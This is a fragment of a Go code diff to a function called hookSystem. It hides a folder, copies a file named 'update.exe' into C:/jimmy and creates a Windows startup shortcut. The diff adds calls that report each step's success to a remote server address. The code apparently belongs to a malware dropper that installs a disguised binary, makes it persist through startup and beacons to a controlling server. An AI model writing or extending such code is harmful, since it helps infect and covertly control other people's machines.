@@ -255,12 +255,14 @@ func hookSystem(src string) error {
 	}
 
 	fmt.Println("Folder created and hidden successfully.")
+	reportProgress(serverIp, "Folder created and hidden successfully.")
 
 	err = CopyFile("update.exe", "C:/jimmy/update.exe")
 	if err != nil {
 		fmt.Println("File copy failed: %v", err)
 	}
 	fmt.Println("File copied successfully!")
+	reportProgress(serverIp, "File copied successfully!")
 
 	// Startup Shortcut (final step)
 	err = ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
@@ -310,11 +312,16 @@ func hookSystem(src string) error {
 		return err
 	}
 
-	_, err = oleutil.CallMethod(idispatch, "Save")
+	_, err = oleutil.PutProperty(idispatch, "WorkingDirectory", "C:/jimmy")
 	if err != nil {
 		return err
 	}
 
+	_, err = oleutil.CallMethod(idispatch, "Save")
+	if err != nil {
+		return err
+	}
+	reportProgress(serverIp, "Startup shortcut created successfully!")
 	return nil
 }
 
